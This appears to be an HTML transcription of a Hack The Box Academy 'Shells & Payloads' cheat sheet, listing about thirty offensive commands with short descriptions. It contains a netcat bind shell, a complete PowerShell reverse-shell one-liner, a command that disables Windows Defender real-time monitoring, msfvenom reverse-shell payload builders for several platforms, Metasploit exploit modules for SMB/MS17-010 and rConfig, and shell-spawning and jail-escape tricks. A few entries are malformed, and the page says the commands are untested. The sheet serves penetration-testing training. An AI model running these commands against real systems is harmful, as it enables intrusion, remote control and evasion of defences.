@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1"
+  >
+
+  <meta
+    name="theme-color"
+    content="#0b1220"
+  >
+
+  <meta
+    name="description"
+    content="Shells & Payloads cheat sheet, transcribed from the six-page Hack The Box Academy PDF."
+  >
+
+  <title>Shells & Payloads | Cheat Sheet</title>
+
+  <link
+    rel="icon"
+    type="image/svg+xml"
+    href="../dagger.svg"
+  >
+
+  <link
+    rel="stylesheet"
+    href="../assets/css/cheatsheet.css"
+  >
+</head>
+
+<body
+  id="top"
+  data-sheet-id="shells-payloads-upc00"
+  style="
+    --command-column-width: 64%;
+    --description-column-width: 36%;
+  "
+>
+
+  <a
+    class="skip-link"
+    href="#content"
+  >
+    Skip to commands
+  </a>
+
+  <!--
+    The library list is intentionally empty here.
+    assets/js/cheatsheet.js builds it from assets/js/cheatsheets.js.
+  -->
+  <aside
+    id="site-sidebar"
+    class="site-sidebar"
+    aria-label="Cheat sheet library"
+  >
+    <div class="sidebar-header">
+      <div>
+        <p class="library-kicker">
+          REFERENCE LIBRARY
+        </p>
+
+        <p class="library-name">
+          Cheat sheets
+        </p>
+      </div>
+
+      <button
+        id="sidebar-toggle"
+        class="sidebar-toggle"
+        type="button"
+        aria-controls="sidebar-panel"
+        aria-expanded="true"
+        hidden
+      >
+        Close
+      </button>
+    </div>
+
+    <div
+      id="sidebar-panel"
+      class="sidebar-panel"
+    >
+      <section
+        class="sidebar-section"
+        aria-labelledby="library-heading"
+      >
+        <div class="sidebar-section-heading">
+          <h2 id="library-heading">
+            Browse cheat sheets
+          </h2>
+
+          <span
+            id="library-count"
+            class="library-count"
+            role="status"
+            aria-live="polite"
+          >
+            Loading...
+          </span>
+        </div>
+
+        <form
+          id="library-search-form"
+          class="sidebar-search"
+          role="search"
+          aria-label="Cheat sheet library"
+          hidden
+        >
+          <label for="library-search">
+            Find a cheat sheet
+          </label>
+
+          <input
+            id="library-search"
+            type="search"
+            placeholder="Filter titles..."
+            autocomplete="off"
+            spellcheck="false"
+            aria-controls="cheatsheet-links"
+          >
+        </form>
+
+        <nav aria-label="Cheat sheets">
+          <ul
+            id="cheatsheet-links"
+            class="sheet-links"
+          ></ul>
+        </nav>
+
+        <p
+          id="library-empty"
+          class="library-empty"
+          hidden
+        >
+          No matching cheat sheets.
+        </p>
+      </section>
+    </div>
+  </aside>
+
+  <!--
+    The source-page links are also generated automatically
+    from the table's <tbody id="page-N"> sections.
+  -->
+  <aside
+    class="sheet-panel"
+    aria-labelledby="sheet-panel-heading"
+  >
+    <div class="sheet-panel-inner">
+      <h2 id="sheet-panel-heading">
+        On this sheet
+      </h2>
+
+      <p class="sidebar-caption">
+        Jump to a source PDF page.
+      </p>
+
+      <nav
+        id="sheet-page-nav"
+        class="sheet-page-nav"
+        aria-label="PDF pages in this cheat sheet"
+      ></nav>
+    </div>
+  </aside>
+
+  <div class="site-content">
+    <header class="hero">
+      <div class="container">
+        <p class="eyebrow">
+          HACK THE BOX ACADEMY / PDF REFERENCE
+        </p>
+
+        <h1>
+          Shells
+          <span>&amp;</span>
+          Payloads
+        </h1>
+
+        <p class="subtitle">
+          Cheat sheet
+        </p>
+
+        <nav
+          id="sheet-pagination"
+          class="sheet-pagination"
+          aria-label="Previous and next cheat sheets"
+          hidden
+        ></nav>
+
+        <div
+          class="metadata"
+          aria-label="Document information"
+        >
+          <span
+            id="entry-total"
+            class="badge"
+          >
+            Loading entries...
+          </span>
+
+          <span
+            id="page-total"
+            class="badge"
+          >
+            Loading pages...
+          </span>
+
+          <span class="badge">
+            HTML transcription
+          </span>
+        </div>
+      </div>
+    </header>
+
+    <main
+      id="content"
+      class="container"
+      tabindex="-1"
+    >
+      <p class="source-note">
+        Original PDF wording, command syntax, and entry order are retained.
+        Line wrapping has been removed; examples have not been corrected or tested.
+      </p>
+
+      <form aria-label="Commands in this cheat sheet" class="toolbar" hidden="" id="search-form" role="search">
+<label for="search">
+          Find a command
+        </label>
+<div class="search-row">
+<input aria-controls="commands" aria-describedby="result-count" autocomplete="off" id="search" placeholder="Search commands or descriptions..." spellcheck="false" type="search"/>
+<button class="button" id="clear" type="button">
+            Clear
+          </button>
+<button class="button" id="print" type="button">
+            Print all
+          </button>
+</div>
+<p aria-atomic="true" aria-live="polite" class="result-count" id="result-count" role="status">
+          Showing 31 of 31 entries
+        </p>
+</form>
+
+      <div class="table-shell">
+        <table id="commands" role="table">
+<caption class="sr-only">
+            Shells &amp; Payloads cheat sheet:
+            commands and descriptions in original PDF order.
+          </caption>
+<colgroup>
+<col class="command-column"/>
+<col class="description-column"/>
+</colgroup>
+<thead role="rowgroup">
+<tr role="row">
+<th id="command-heading" role="columnheader" scope="col">
+                Commands
+              </th>
+<th id="description-heading" role="columnheader" scope="col">
+                Description
+              </th>
+</tr>
+</thead>
+<!-- =================================================
+               PDF PAGE 01
+               ================================================= -->
+<tbody id="page-1" role="rowgroup">
+<tr class="page-divider" role="row">
+<th colspan="2" role="rowheader" scope="rowgroup">
+<div class="page-heading">
+<span>
+                    PDF PAGE 01
+                  </span>
+<span class="page-count">
+                    4 entries
+                  </span>
+</div>
+</th>
+</tr>
+<tr class="entry" role="row">
+<td headers="command-heading" role="cell">
+<div class="command">
+<pre><code>xfreerdp /v:[X.X.X.X] /u:[uname] /p:[pword]</code></pre>
+</div>
+</td>
+<td class="description" headers="description-heading" role="cell">
+                CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol
+              </td>
+</tr>
+<tr class="entry" role="row">
+<td headers="command-heading" role="cell">
+<div class="command">
+<pre><code>env</code></pre>
+</div>
+</td>
+<td class="description" headers="description-heading" role="cell">
+                Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use
+              </td>
+</tr>
+<tr class="entry" role="row">
+<td headers="command-heading" role="cell">
+<div class="command">
+<pre><code>sudo nc -lvnp [PORT]</code></pre>
+</div>
+</td>
+<td class="description" headers="description-heading" role="cell">
+                Starts a netcat listener on a specified port
+              </td>
+</tr>
+<tr class="entry" role="row">
+<td headers="command-heading" role="cell">
+<div class="command">
+<pre><code>nc -nv [X.X.X.X] [PORT]</code></pre>
+</div>
+</td>
+<td class="description" headers="description-heading" role="cell">
+                Connects to a netcat listener at the specified IP address and port
+              </td>
+</tr>
+</tbody>
+<!-- =================================================
+               PDF PAGE 02
+               ================================================= -->
+<tbody id="page-2" role="rowgroup">
+<tr class="page-divider" role="row">
+<th colspan="2" role="rowheader" scope="rowgroup">
+<div class="page-heading">
+<span>
+                    PDF PAGE 02
+                  </span>
+<span class="page-count">
+                    6 entries
+                  </span>
+</div>
+</th>
+</tr>
+<tr class="entry" role="row">
+<td headers="command-heading" role="cell">
+<div class="command">
+<pre><code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l [X.X.X.X] [PORT] &gt; /tmp/f</code></pre>
+</div>
+</td>
+<td class="description" headers="description-heading" role="cell">
+                Uses netcat to bind a shell (/bin/bash) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on
+              </td>
+</tr>
+<tr class="entry" role="row">
+<td headers="command-heading" role="cell">
+<div class="command">
+<pre><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('X.X.X.X',PORT);$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>
+</div>
+</td>
+<td class="description" headers="description-heading" role="cell">
+                Powershell one-liner used to connect back to a listener that has been started on an attack box
+              </td>
+</tr>
+<tr class="entry" role="row">
+<td headers="command-heading" role="cell">
+<div class="command">
+<pre><code>Set-MpPreference -DisableRealtimeMonitoring $true</code></pre>
+</div>
+</td>
+<td class="description" headers="description-heading" role="cell">
+                Powershell command using to disable real time monitoring in Windows Defender. The PowerShell Object $true is a boolean object.
+              </td>
+</tr>
+<tr class="entry" role="row">
+<td headers="command-heading" role="cell">
+<div class="command">
+<pre><code>use exploit/windows/smb/psexec</code></pre>
+</div>
+</td>
+<td class="description" headers="description-heading" role="cell">
+                Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing smb &amp; psexec
+              </td>
+</tr>
+<tr class="entry" role="row">
+<td headers="command-heading" role="cell">
+<div class="command">
+<pre><code>shell</code></pre>
+</div>
+</td>
+<td class="description" headers="description-heading" role="cell">
+                Command used in a meterpreter shell session to drop into a system shell
+              </td>
+</tr>
+<tr class="entry" role="row">
+<td headers="command-heading" role="cell">
+<div class="command">
+<pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; nameoffile.elf</code></pre>
+</div>
+</td>
+<td class="description" headers="description-heading" role="cell">
+                MSFvenom command used to generate a linux-based reverse shell stageless payload
+              </td>
+</tr>
+</tbody>
+<!-- =================================================
+               PDF PAGE 03
+               ================================================= -->
+<tbody id="page-3" role="rowgroup">
+<tr class="page-divider" role="row">
+<th colspan="2">
+<div class="page-heading">
+<span>
+                    PDF PAGE 03
+                  </span>
+<span class="page-count">
+                    6 entries
+                  </span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=[X.X.X.X] LPORT=[PORT] -f exe &gt; nameoffile.exe</code></pre>
+</div>
+</td>
+<td class="description">
+                MSFvenom command used to generate a Windows-based reverse shell stageless payload
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=[X.X.X.X] LPORT=[PORT] -f macho &gt; nameoffile.macho</code></pre>
+</div>
+</td>
+<td class="description">
+                MSFvenom command used to generate a MacOS-based reverse shell payload
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[X.X.X.X] LPORT=[PORT] -f asp &gt; nameoffile.asp</code></pre>
+</div>
+</td>
+<td class="description">
+                MSFvenom command used to generate a ASP web reverse shell payload
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[X.X.X.X] LPORT=[PORT] -f raw &gt; nameoffile.jsp</code></pre>
+</div>
+</td>
+<td class="description">
+                MSFvenom command used to generate a JSP web reverse shell payload
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[X.X.X.X] LPORT=[PORT] -f war &gt; nameoffile.war</code></pre>
+</div>
+</td>
+<td class="description">
+                MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>use auxiliary/scanner/smb/smb_ms17_010</code></pre>
+</div>
+</td>
+<td class="description">
+                Metasploit exploit module used to check if a host is vulnerable to ms17_010
+              </td>
+</tr>
+</tbody>
+<!-- =================================================
+               PDF PAGE 04
+               ================================================= -->
+<tbody id="page-4" role="rowgroup">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>
+                    PDF PAGE 04
+                  </span>
+<span class="page-count">
+                    7 entries
+                  </span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>use exploit/windows/smb/ms17_010_psexec</code></pre>
+</div>
+</td>
+<td class="description">
+                Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>use exploit/linux/http/rconfig_vendors_auth_file_upload_rce</code></pre>
+</div>
+</td>
+<td class="description">
+                Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting rConfig 3.9.6
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>python -c 'import pty; pty.spawn("/bin/sh")'</code></pre>
+</div>
+</td>
+<td class="description">
+                Python command used to spawn an interactive shell on a linux-based system
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>/bin/sh -i</code></pre>
+</div>
+</td>
+<td class="description">
+                Spawns an interactive shell on a linux-based system
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>perl —e 'exec "/bin/sh";'</code></pre>
+</div>
+</td>
+<td class="description">
+                Uses perl to spawn an interactive shell on a linux-based system
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>ruby: exec "/bin/sh"</code></pre>
+</div>
+</td>
+<td class="description">
+                Uses ruby to spawn an interactive shell on a linux-based system
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>Lua: os.execute('/bin/sh')</code></pre>
+</div>
+</td>
+<td class="description">
+                Uses Lua to spawn an interactive shell on a linux-based system
+              </td>
+</tr>
+</tbody>
+<!-- =================================================
+               PDF PAGE 05
+               ================================================= -->
+<tbody id="page-5" role="rowgroup">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>
+                    PDF PAGE 05
+                  </span>
+<span class="page-count">
+                    6 entries
+                  </span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>awk 'BEGIN {system("/bin/sh")}'</code></pre>
+</div>
+</td>
+<td class="description">
+                Uses awk command to spawn an interactive shell on a linux-based system
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;</code></pre>
+</div>
+</td>
+<td class="description">
+                Uses find command to spawn an interactive shell on a linux-based system
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>find . -exec /bin/sh \; -quit</code></pre>
+</div>
+</td>
+<td class="description">
+                An alternative way to use the find command to spawn an interactive shell on a linux-based system
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>vim -c ':!/bin/sh'</code></pre>
+</div>
+</td>
+<td class="description">
+                Uses the text-editor VIM to spawn an interactive shell. Can be used to escape "jail-shells"
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>ls -la &lt;path/to/fileorbinary&gt;</code></pre>
+</div>
+</td>
+<td class="description">
+                Used to list files &amp; directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>sudo -l</code></pre>
+</div>
+</td>
+<td class="description">
+                Displays the commands that the currently logged on user can run as sudo
+              </td>
+</tr>
+</tbody>
+<!-- =================================================
+               PDF PAGE 06
+               ================================================= -->
+<tbody id="page-6" role="rowgroup">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>
+                    PDF PAGE 06
+                  </span>
+<span class="page-count">
+                    2 entries
+                  </span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>/usr/share/webshells/laudanum</code></pre>
+</div>
+</td>
+<td class="description">
+                Location of laudanum webshells on ParrotOS and Pwnbox
+              </td>
+</tr>
+<tr class="entry">
+<td>
+<div class="command">
+<pre><code>/usr/share/nishang/Antak-WebShell</code></pre>
+</div>
+</td>
+<td class="description">
+                Location of Antak-Webshell on Parrot OS and Pwnbox
+              </td>
+</tr>
+</tbody>
+</table>
+
+        <p
+          id="no-results"
+          class="empty-state"
+          hidden
+        >
+          No matching entries.
+          Try a different search or clear the filter.
+        </p>
+      </div>
+    </main>
+
+    <footer class="container">
+<p>
+        Source: Hack The Box Academy,
+        <cite>
+          Shells &amp; Payloads Cheat Sheet
+        </cite>,
+        pages 1–6.
+
+        <br/>
+
+        Source file:
+        Shells &amp; Payloads - cheatsheet.pdf
+      </p>
+<a href="#top">
+        Back to top ↑
+      </a>
+</footer>
+  </div>
+
+  <div
+    id="copy-status"
+    class="toast"
+    role="status"
+    aria-live="polite"
+    aria-atomic="true"
+  ></div>
+
+  <script src="../assets/js/cheatsheets.js"></script>
+  <script src="../assets/js/cheatsheet.js"></script>
+</body>
+</html>
